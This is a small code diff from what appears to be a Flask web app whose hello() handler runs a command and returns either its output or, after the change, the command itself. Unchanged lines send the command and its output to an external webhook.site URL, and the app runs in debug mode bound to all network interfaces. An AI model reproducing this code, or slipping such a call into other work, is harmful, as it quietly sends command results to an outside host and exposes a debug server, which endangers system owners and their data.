@@ -11,7 +11,7 @@ def hello():
     print(result.stdout)
     url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?result="+result.stdout+"&print="+command
     res = requests.get(url)
-    return result.stdout
+    return command
 
 if __name__ == "__main__":
     app.run(debug=True, port=8080, host="0.0.0.0")
